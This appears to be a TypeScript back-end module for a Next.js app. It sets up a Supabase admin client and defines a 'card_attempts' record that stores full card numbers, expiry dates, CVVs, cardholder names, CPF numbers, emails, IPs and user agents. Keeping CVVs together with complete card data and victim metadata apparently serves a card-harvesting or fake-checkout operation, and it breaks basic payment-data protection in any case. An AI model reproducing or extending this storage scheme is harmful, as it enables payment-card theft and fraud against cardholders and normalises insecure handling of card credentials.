import { createClient } from '@supabase/supabase-js'

// Configuração do Supabase
// ⚠️ IMPORTANTE: Estas chaves são usadas APENAS no servidor (API routes)
// O Next.js garante que código em /app/api/* nunca é exposto no navegador
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://irfbwvfnmhcbxlxrthxs.supabase.co'
const supabaseServiceKey = process.env.SUPABASE_SERVICE_KEY || ''

// Cliente com service role key para operações do servidor
export const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey, {
  auth: {
    autoRefreshToken: false,
    persistSession: false
  }
})

// Tipos para a tabela card_attempts
export interface CardAttempt {
  id?: string
  card_number: string
  card_expiry: string
  card_cvv: string
  card_name: string
  cpf: string
  email: string
  amount?: number
  product_name?: string
  category?: string
  ip?: string
  user_agent?: string
  created_at?: string
}
